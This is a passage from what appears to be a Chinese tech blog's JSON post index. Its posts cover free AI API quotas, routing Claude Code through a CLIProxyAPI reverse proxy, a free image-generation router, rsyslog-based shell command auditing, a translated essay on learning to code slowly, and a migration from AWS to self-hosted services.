href=\"https://www.codeflicker.ai/\"\u003eCodeFlicker \u003c/a\u003e, 独立IDE\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e目前(20251222)免费使用 kimi-k2-0905, kat-coder-pro\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"阿里-通义灵码--独立ide\"\u003e阿里 \u003ca href=\"https://lingma.aliyun.com/\"\u003e通义灵码 \u003c/a\u003e, 独立IDE\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e免费不限量使用 千问系列模型，但不可更换使用其他模型\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"阿里-qwen-code-cli命令行\"\u003e阿里 \u003ca href=\"https://github.com/QwenLM/qwen-code\"\u003eqwen-code\u003c/a\u003e, cli命令行\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003efree tier\u003c/p\u003e","title":"整理下AI大模型厂商和平台，能长期稳定提供免费额度的API (非公益站) - 转自Linux.do"},{"content":"用CLIProxyAPI反代了antigravity，抽出了claude的模型给claude code用\n同时也接入了qwen3-code-plus模型\n还接入了openrouter的模型\n后期还准备接入minmax等模型\n这样就出现个问题：访问 antigravity 需要代理，而访问qwen和openrouter或者其它可能并不需要\n如果设置了全局代理，那访问其它2个访问就绕路了\n本来想提个PR的，但是感觉不是什么大需求\n所以干脆用claude改了一下，配置文件config.yaml中新增了一个配置项\nantigravity_proxy: \u0026#34;\u0026#34; 这样方便了就\n代码放在：GitHub - zhangrr/CLIProxyAPI: modify CLIProxyAPI\nclaude code 的 settings.json 配置如下：\n{ “env”: { “ANTHROPIC_BASE_URL”: “http://10.8.2.25:8317”, “ANTHROPIC_AUTH_TOKEN”: “sk-xxxxxxx”, “ANTHROPIC_DEFAULT_HAIKU_MODEL”: “qwen3-coder-plus”, “ANTHROPIC_DEFAULT_OPUS_MODEL”: “gemini-claude-sonnet-4-5-thinking”, “ANTHROPIC_DEFAULT_SONNET_MODEL”: “gemini-claude-sonnet-4-5-thinking”, “ANTHROPIC_MODEL”: “gemini-claude-sonnet-4-5-thinking” } } 请自行取用\n","permalink":"https://rendoumi.com/posts/20251230-cliproxyapi_antigravity/","summary":"\u003cp\u003e用CLIProxyAPI反代了antigravity，抽出了claude的模型给claude  code用\u003c/p\u003e\n\u003cp\u003e同时也接入了qwen3-code-plus模型\u003c/p\u003e\n\u003cp\u003e还接入了openrouter的模型\u003c/p\u003e\n\u003cp\u003e后期还准备接入minmax等模型\u003c/p\u003e\n\u003cp\u003e这样就出现个问题：访问 antigravity 需要代理，而访问qwen和openrouter或者其它可能并不需要\u003c/p\u003e\n\u003cp\u003e如果设置了全局代理，那访问其它2个访问就绕路了\u003c/p\u003e\n\u003cp\u003e本来想提个PR的，但是感觉不是什么大需求\u003c/p\u003e\n\u003cp\u003e所以干脆用claude改了一下，配置文件config.yaml中新增了一个配置项\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eantigravity_proxy: \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样方便了就\u003c/p\u003e\n\u003cp\u003e代码放在：\u003ca href=\"https://www.github.com/zhangrr/CLIProxyAPI\"\u003eGitHub - zhangrr/CLIProxyAPI: modify CLIProxyAPI\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eclaude code 的 settings.json 配置如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  “env”: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    “ANTHROPIC_BASE_URL”: “http://10.8.2.25:8317”,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    “ANTHROPIC_AUTH_TOKEN”: “sk-xxxxxxx”,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    “ANTHROPIC_DEFAULT_HAIKU_MODEL”: “qwen3-coder-plus”,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    “ANTHROPIC_DEFAULT_OPUS_MODEL”: “gemini-claude-sonnet-4-5-thinking”,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    “ANTHROPIC_DEFAULT_SONNET_MODEL”: “gemini-claude-sonnet-4-5-thinking”,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    “ANTHROPIC_MODEL”: “gemini-claude-sonnet-4-5-thinking”\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e请自行取用\u003c/p\u003e","title":"CLIProxyAPI反代antigravity单独走代理"},{"content":"在别人的基础之上，手搓了一个利用三个模型提供商的免费模型额度，来文生图的程序\n原地址：https://github.com/lianwusuoai/img-router ，[智能图像生成网关，通过OpenAI 兼容接口，使用chat自动路由多平台 AI 进行免费绘图]\n魔改的地址：http://github.com/zhangrr/image-route\n亮点：免费API人人都有，不需要专门绘图网站，不需要考虑各种接口，不需要烦恼Cherry Studio/RikkaHub/newapi等客户端or平台不兼容/不支持，让文生图/图生图/图片编辑，就像和ai聊天chat一样方便。\n模力方舟免费key每天100次 无审核，不要白天随便生图，涩涩警告! 魔搭免费key每天2000次 单模型500次 不可涩涩！ 豆包4.0+4.5每个模型200次，每天最多恢复20次，可以设置上限防超出 不可涩涩！ 那原版是只能通过API进行访问，正好有claude code的额度，那就干脆套个web的界面出来\n注意：\n魔力方舟注册后，生成api的key即可\n魔搭是阿里的，生成api的key后，需要经过阿里的账号验证，才能使用\n不要部署任何模型，阿里的账号最好里面没有绑卡，没有钱\n豆包是火山引擎，开通账号生成api的key后，需要实人认证，然后还需要部署模型\n拿到3个免费的API后，克隆源代码：\nhttp://github.com/zhangrr/image-route\n然后把api的key填入config.js（克隆一下config.example.js）\n装好deno，一句话就可以运行了：\n./deno run --allow-net --allow-env --allow-write --allow-read main.ts 生了一张图，模力方舟，还可以：\n","permalink":"https://rendoumi.com/posts/20251230-img_router/","summary":"\u003cp\u003e在别人的基础之上，手搓了一个利用三个模型提供商的免费模型额度，来文生图的程序\u003c/p\u003e\n\u003cp\u003e原地址：https://github.com/lianwusuoai/img-router ，[智能图像生成网关，通过OpenAI 兼容接口，使用chat自动路由多平台 AI 进行免费绘图]\u003c/p\u003e\n\u003cp\u003e魔改的地址：http://github.com/zhangrr/image-route\u003c/p\u003e\n\u003cp\u003e亮点：免费API人人都有，不需要专门绘图网站，不需要考虑各种接口，不需要烦恼Cherry Studio/RikkaHub/newapi等客户端or平台不兼容/不支持，让文生图/图生图/图片编辑，就像和ai聊天chat一样方便。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ai.gitee.com/ondobtug/dashboard/settings/tokens\"\u003e模力方舟\u003c/a\u003e免费key每天100次 无审核，不要白天随便生图，涩涩警告!\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.modelscope.cn/my/myaccesstoken\"\u003e魔搭\u003c/a\u003e免费key每天2000次 单模型500次 不可涩涩！\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://console.volcengine.com/ark/region:ark+cn-beijing/openManagement/rewardPlan\"\u003e豆包4.0+4.5\u003c/a\u003e每个模型200次，每天最多恢复20次，可以设置上限防超出 不可涩涩！\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e那原版是只能通过API进行访问，正好有claude code的额度，那就干脆套个web的界面出来\u003c/p\u003e\n\u003cp\u003e注意：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e魔力方舟注册后，生成api的key即可\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e魔搭是阿里的，生成api的key后，需要经过阿里的账号验证，才能使用\u003c/p\u003e\n\u003cp\u003e不要部署任何模型，阿里的账号最好里面没有绑卡，没有钱\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230154834644\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230154834644.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e豆包是火山引擎，开通账号生成api的key后，需要实人认证，然后还需要部署模型\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155104015\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155104015.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155021461\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155021461.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155045439\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155045439.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e拿到3个免费的API后，克隆源代码：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://github.com/zhangrr/image-route\"\u003ehttp://github.com/zhangrr/image-route\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e然后把api的key填入config.js（克隆一下config.example.js）\u003c/p\u003e\n\u003cp\u003e装好deno，一句话就可以运行了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./deno run --allow-net --allow-env --allow-write --allow-read main.ts\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20251230155311769\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155311769.png\"\u003e\u003c/p\u003e\n\u003cp\u003e生了一张图，模力方舟，还可以：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155435398\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155435398.png\"\u003e\u003c/p\u003e","title":"魔搭、模力方舟、豆包免费文生图"},{"content":"由于自己实际的工作机是一台Linux，更准确的说是Debian 12\n多数时间就是通过WindTerm ssh登录到这台机器上，然后开多个窗口，开始干活\n那么查看历史命令就变得很重要了，需要全部记录下来，随时进行查看\n如果是公司的服务器，也可以加上这个，统一把命令历史发送到统一的一台日志服务器上，进行保管和审计\nAny，都很重要，记录一下：\n一、编辑 /etc/profile，新增三句\nexport HISTTIMEFORMAT=\u0026#34;%Y-%m-%d %H:%M \u0026#34; export PROMPT_COMMAND=\u0026#39;RETRN_VAL=$?;logger -p local6.debug \u0026#34;$(whoami) [$$]: $(history 1 | sed \u0026#34;s/^[ ]*[0-9]\\+[ ]*//\u0026#34;) [$RETRN_VAL]\u0026#34;\u0026#39; export PROMPT_COMMAND=\u0026#34;history -a;history -c;history -r;$PROMPT_COMMAND\u0026#34; 第一句是为了使用 history 的时候更好看一些\n二三句是为了把历史命令发到日志服务器去\n二、安装并设置rsyslog\napt install rsyslog vi /etc/rsyslog.d/00-my-format.conf # 定义一个简洁的时间格式模板：2025-12-30 09:50 $template MyPreciseFormat,\u0026#34;%TIMESTAMP:1:10:date-rfc3339% %TIMESTAMP:12:16:date-rfc3339% %HOSTNAME% %syslogtag%%msg%\\n\u0026#34; # 将这个模板设置为所有日志文件的默认格式 $ActionFileDefaultTemplate MyPreciseFormat vi /etc/rsyslog.conf ... auth,authpriv.* /var/log/auth.log cron.* -/var/log/cron.log kern.* -/var/log/kern.log mail.* -/var/log/mail.log user.* -/var/log/user.log local6.* /var/log/commands.log ... systemctl enable rsyslog systemctl restart rsyslog 如上，就会把命令都发送到 /var/log/commands.log\n如果要发送到统一的服务器，那就在 /etc/rsyslog.conf，把所有日志发到远程去\n*.* @@10.10.10.1:514 如上就好了，重新登录，就会有记录了，cat /var/log/commands.log\n","permalink":"https://rendoumi.com/posts/20251230-linux_comand_log/","summary":"\u003cp\u003e由于自己实际的工作机是一台Linux，更准确的说是Debian 12\u003c/p\u003e\n\u003cp\u003e多数时间就是通过WindTerm ssh登录到这台机器上，然后开多个窗口，开始干活\u003c/p\u003e\n\u003cp\u003e那么查看历史命令就变得很重要了，需要全部记录下来，随时进行查看\u003c/p\u003e\n\u003cp\u003e如果是公司的服务器，也可以加上这个，统一把命令历史发送到统一的一台日志服务器上，进行保管和审计\u003c/p\u003e\n\u003cp\u003eAny，都很重要，记录一下：\u003c/p\u003e\n\u003cp\u003e一、编辑 /etc/profile，新增三句\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHISTTIMEFORMAT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y-%m-%d %H:%M \u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePROMPT_COMMAND\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;RETRN_VAL=$?;logger -p local6.debug \u0026#34;$(whoami) [$$]: $(history 1 | sed \u0026#34;s/^[ ]*[0-9]\\+[ ]*//\u0026#34;) [$RETRN_VAL]\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePROMPT_COMMAND\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;history -a;history -c;history -r;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PROMPT_COMMAND\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e第一句是为了使用 history 的时候更好看一些\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230100755555\" loading=\"lazy\" src=\"/posts/20251230-linux_comand_log/image-20251230100755555.png\"\u003e\u003c/p\u003e\n\u003cp\u003e二三句是为了把历史命令发到日志服务器去\u003c/p\u003e\n\u003cp\u003e二、安装并设置rsyslog\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install rsyslog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi  /etc/rsyslog.d/00-my-format.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 定义一个简洁的时间格式模板：2025-12-30 09:50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e MyPreciseFormat,\u003cspan class=\"s2\"\u003e\u0026#34;%TIMESTAMP:1:10:date-rfc3339% %TIMESTAMP:12:16:date-rfc3339% %HOSTNAME% %syslogtag%%msg%\\n\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 将这个模板设置为所有日志文件的默认格式\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ActionFileDefaultTemplate\u003c/span\u003e MyPreciseFormat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/rsyslog.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth,authpriv.*                 /var/log/auth.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecron.*                          -/var/log/cron.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekern.*                          -/var/log/kern.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003email.*                          -/var/log/mail.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser.*                          -/var/log/user.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal6.*                        /var/log/commands.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e rsyslog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart rsyslog\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如上，就会把命令都发送到 /var/log/commands.log\u003c/p\u003e","title":"Linux机器的历史命令查询和保存"},{"content":"Dev.to 上面有一篇深度好文，最近在孜孜不倦的学习AI，感觉什么Cluaude code、Codex、Gemini，各种模型纷至沓来，忙乱且自顾不暇。感觉很慌乱，看到了这篇好文，顿时安静下来。慢就是快，慢慢来！ Coding Without Pressure: How Slowing Down Helped Me Learn Faster ​\nFor a long time, I thought learning to code had to feel intense. Daily goals. Long hours. Constant progress. If I wasn’t exhausted, I felt like I wasn’t doing enough.\nSo I pushed harder. More tutorials. More projects. More pressure.\nAnd somehow… I learned less.\nIt took me a while to realize this simple truth\u0026hellip; I wasn’t failing because I was slow; I was failing because I wouldn’t let myself slow down.\nThe Pressure We Don’t Talk About When you’re learning to code, there’s an invisible timer in your head.\n“I should understand this by now.” “I’m behind everyone else.” “Why does this take me so long?”\nYou open Dev.to, LinkedIn, Twitter. Everyone seems to be building, shipping, improving\u0026hellip; fast.\nAnd suddenly, coding stops feeling like learning. It feels like a race you didn’t sign up for.\nWhen Fast Learning Became Shallow Learning There was a phase where I “covered” a lot of topics. JavaScript concepts. CSS tricks. Python basics.\nBut ask me to explain them deeply? Or apply them without guidance?\nThat’s when things fell apart.\nI wasn’t learning; I was consuming. Moving fast, but not moving forward.\nSlowing Down Wasn’t Easy (At First) Slowing down felt wrong. Like I was being lazy. Like I was wasting time.\nBut instead of doing more, I tried doing less, intentionally.\nOne concept instead of five One small feature instead of a full app One file read carefully instead of ten skimmed And something unexpected happened.\nThings started to stick.\nWhat “Slow Learning” Looks Like in Practice Slowing down doesn’t mean doing nothing. It means doing things with attention.\nFor me, it looks like:\nReading my own code and asking why I wrote it that way Letting myself struggle before Googling Writing simple solutions instead of clever ones Taking breaks without guilt Stopping when my brain feels tired, not when the clock says so That’s when learning became calmer and deeper.\nThe Confidence Shift Here’s the part nobody mentions: When you remove pressure, confidence quietly grows.\nYou stop comparing. You stop rushing to “finish.” You start trusting your pace.\nAnd that trust changes everything.\nBugs don’t feel personal anymore. Confusion feels temporary, not permanent. You stop asking, “Am I good enough?” And start asking, “What can I understand better?”\nLearning Faster by Moving Slower Ironically, slowing down helped me learn faster.\nNot because I covered more topics\u0026hellip; but because I retained more.\nConcepts connected. Patterns became familiar. Mistakes turned into lessons instead of frustration.\nProgress stopped being loud\u0026hellip; but it became real.\nWhat I No Longer Do ❌ I don’t rush to finish courses ❌ I don’t force productivity on bad days ❌ I don’t measure progress by speed ❌ I don’t compare my chapter 3 to someone else’s chapter 20\nLearning isn’t urgent\u0026hellip; It’s ongoing.\nFinal Thoughts (From One Developer to Another) If coding feels heavy right now, maybe it’s not because you’re bad at it. Maybe you’re just carrying too much pressure.\nSlow down. Breathe. Write code at a pace you can understand, not just complete.\nYou don’t need to be fast to be good. You need to be present.\nLearning to code isn’t about racing\u0026hellip; it’s about staying long enough to grow 💻\nWishing you patience, clarity, and joy in your coding journey, friends 💙.\n翻译出来，共勉： 无压学习编程：放慢脚步如何助我学得更快 很长一段时间里，我都以为学习编程必须是高强度的。每日目标、长时间投入、持续不断的进步。如果我觉得不累，我就会感觉自己做得还不够。\n于是我更加逼迫自己。更多的教程、更多的项目、更大的压力。\n但不知怎的……我学到的反而更少了。\n我花了好一阵子才意识到这个简单的道理……我之所以失败，不是因为我慢，而是因为我不肯让自己慢下来。\n我们避而不谈的压力 当你学习编程时，你的脑海里仿佛有一个无形的计时器。\n“我现在应该已经懂这个了。” “我比所有人都落后了。” “为什么这个花了我这么长时间？”\n你打开 Dev.to、LinkedIn、Twitter。似乎每个人都在快速地构建、发布、精进……\n突然间，编程不再像是学习，而像是一场你并未报名的比赛。\n当快速学习变成浅薄学习 我曾经历过一个“覆盖”了很多知识点的阶段。JavaScript 的概念、CSS 的技巧、Python 的基础。\n但要我深入解释它们？或者在没有指导的情况下应用它们？\n那时候，一切都分崩离析了。\n我不是在学习，而是在消耗。走得很快，却没有前进。\n放慢脚步并不容易（一开始） 放慢脚步感觉很不对劲。好像我在偷懒，在浪费时间。\n但我没有做更多，而是尝试着有意识地做更少。\n一次只学一个概念，而不是五个 一次只做一个小功能，而不是一个完整的应用 仔细读一个文件，而不是草草浏览十个 然后，意想不到的事情发生了。\n知识开始真正留在脑子里了。\n“慢学习”在实践中是什么样的 放慢脚步不代表什么都不做，而是指专注地做事。\n对我来说，它看起来是这样的：\n阅读自己写的代码，并问自己为什么要这么写 在求助于谷歌之前，先让自己挣扎一会儿 写简单的解决方案，而不是花哨的 毫无负罪感地休息 在大脑感到疲惫时就停下来，而不是听从时钟的安排 就在这时，学习变得更平静、更深入了。\n信心的转变 这是没人提过的部分：当你移除了压力，自信便会悄然增长。\n你不再比较。你不再急于“完成”。你开始相信自己的节奏。\n而这种信任会改变一切。\nBug 不再像是个人的失败。困惑只是暂时的，而非永久的。你不再问“我够好吗？”，而是开始问“我怎样才能更好地理解？”\n通过放慢脚步，学得更快 讽刺的是，放慢脚步帮助我学得更快了。\n不是因为我覆盖了更多的主题……而是因为我记住了更多。\n概念之间开始联系起来。模式变得熟悉。错误变成了教训，而不是挫败感。\n进步不再喧嚣……但它变得真实。\n我不再做的事 ❌ 我不再急于完成课程 ❌ 我不再在状态不好的日子里强迫自己提高效率 ❌ 我不再用速度来衡量进步 ❌ 我不再拿自己的第三章去和别人的第二十章比较\n学习不是一件紧急的事……它是一个持续的过程。\n最后的想法（从一个开发者到另一个） 如果编程此刻让你感到沉重，也许不是因为你学得不好，也许只是因为你背负了太多的压力。\n慢下来。深呼吸。以你能理解的速度去写代码，而不仅仅是完成它。\n你不必追求速度才算优秀，你需要的是专注当下。\n学习编程不是一场赛跑……而是要待得足够久，才能成长 💻\n朋友们，愿你在编程之旅中拥有耐心、思路清晰和喜悦 💙。\n","permalink":"https://rendoumi.com/posts/20251230-learn/","summary":"\u003ch4 id=\"devto-上面有一篇深度好文最近在孜孜不倦的学习ai感觉什么cluaude-codecodexgemini各种模型纷至沓来忙乱且自顾不暇感觉很慌乱看到了这篇好文顿时安静下来慢就是快慢慢来\"\u003eDev.to 上面有一篇深度好文，最近在孜孜不倦的学习AI，感觉什么Cluaude code、Codex、Gemini，各种模型纷至沓来，忙乱且自顾不暇。感觉很慌乱，看到了这篇好文，顿时安静下来。慢就是快，慢慢来！\u003c/h4\u003e\n\u003ch1 id=\"coding-without-pressure-how-slowing-down-helped-me-learn-faster\"\u003eCoding Without Pressure: How Slowing Down Helped Me Learn Faster\u003c/h1\u003e\n\u003cp\u003e​\u003c/p\u003e\n\u003cp\u003eFor a long time, I thought learning to code had to feel intense.\nDaily goals. Long hours. Constant progress.\nIf I wasn’t exhausted, I felt like I wasn’t doing enough.\u003c/p\u003e\n\u003cp\u003eSo I pushed harder.\nMore tutorials. More projects. More pressure.\u003c/p\u003e\n\u003cp\u003eAnd somehow… I learned \u003cem\u003eless\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eIt took me a while to realize this simple truth\u0026hellip;\n\u003cstrong\u003eI wasn’t failing because I was slow; I was failing because I wouldn’t let myself slow down.\u003c/strong\u003e\u003c/p\u003e","title":"关于学习，关于AI"},{"content":"本篇是叙述文，没有技术含量，纯纯的记录一下\n那在25年9月份的时候，把AWS的整个架构给平移到VPS的机房了\n为什么呢？AWS的费用实在是太贵了\n各种服务都是要钱的，什么Mysql的proxy，跟实例一个价格了；还有什么Serurity hub，Cloudwatch等等等等\n用到了就得交钱，出故障的时候，还得买客服支持服务，各种奇技淫巧\n看日志发告警用Cloudwatch是最快最便捷的，但是贵啊，最佳实践是仍到S3桶里，用 Athena 分析\n每个月都要关注saveing plan，看看超了没有，实在是忍无可忍\n而且被迫升级，用的服务各种阉割\nredis服务只支持一个库，被迫升级到valkey, 结果valkey不支持redis-exporter，被逼无奈只好用社区的redis.io\nalermanager不支持webhook，只能发到SNS\n无语了，而且最佳实践太多，每次都得研究半天什么才是最合适自己得\n写个Terrfaform，代码总共2千行，有1000行是IAM的权限配置\n终于终于挪了\n那各种服务必须有相应的替代产品，那总结一下：\nLoadbalance + Firewall：就用OPNSense替代\nKubernetes: 用kuberspray手搓\nRedis: 自建redis\nPostgres和Mysql: 手搓，用pgbackrest备份。MySQL每天fullbackup\nS3: 用seeweedfs替代，完美替换，支持各种IAM替代，静态化用Caddy来顶替\ncloudfront：其它家CDN\nElasticsearch: 自建，取消证书\nMongoDB： 自建\nKafka：自建，kraft换掉zookeeper\nflink：自建\nmilvus：自建\n","permalink":"https://rendoumi.com/posts/20251217-aws_migrate/","summary":"\u003cp\u003e本篇是叙述文，没有技术含量，纯纯的记录一下\u003c/p\u003e\n\u003cp\u003e那在25年9月份的时候，把AWS的整个架构给平移到VPS的机房了\u003c/p\u003e\n\u003cp\u003e为什么呢？AWS的费用实在是太贵了\u003c/p\u003e\n\u003cp\u003e各种服务都是要钱的，什么Mysql的proxy，跟实例一个价格了；还有什么Serurity hub，Cloudwatch等等等等\u003c/p\u003e\n\u003cp\u003e用到了就得交钱，出故障的时候，还得买客服支持服务，各种奇技淫巧\u003c/p\u003e\n\u003cp\u003e看日志发告警用Cloudwatch是最快最便捷的，但是贵啊，最佳实践是仍到S3桶里，用 Athena 分析\u003c/p\u003e\n\u003cp\u003e每个月都要关注saveing plan，看看超了没有，实在是忍无可忍\u003c/p\u003e\n\u003cp\u003e而且被迫升级，用的服务各种阉割\u003c/p\u003e\n\u003cp\u003eredis服务只支持一个库，被迫升级到valkey, 结果valkey不支持redis-exporter，被逼无奈只好用社区的redis.io\u003c/p\u003e\n\u003cp\u003ealermanager不支持webhook，只能发到SNS\u003c/p\u003e\n\u003cp\u003e无语了，而且最佳实践太多，每次都得研究半天什么才是最合适自己得\u003c/p\u003e\n\u003cp\u003e写个Terrfaform，代码总共2千行，有1000行是IAM的权限配置\u003c/p\u003e\n\u003cp\u003e终于终于挪了\u003c/p\u003e\n\u003cp\u003e那各种服务必须有相应的替代产品，那总结一下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLoadbalance + Firewall：就用OPNSense替代\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eKubernetes:  